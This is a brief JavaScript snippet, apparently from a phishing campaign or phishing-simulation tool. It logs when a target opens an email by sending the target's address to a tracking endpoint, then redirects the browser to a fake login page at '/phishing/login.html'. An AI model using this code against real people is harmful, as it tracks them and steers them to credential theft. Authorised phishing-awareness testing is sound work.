// Track when user opens email - 1x1 transparent pixel
const campaignId = '{{campaign_id}}';
const targetEmail = '{{target_email}}';
const hash = '{{hash}}';

// Send tracking request
fetch('/api/v1/track/open?c=' + campaignId + '&e=' + encodeURIComponent(targetEmail) + '&h=' + hash)
  .then(() => {
    // Redirect to phishing page
    window.location.href = '/phishing/login.html?c=' + campaignId + '&e=' + encodeURIComponent(targetEmail) + '&h=' + hash;
  });
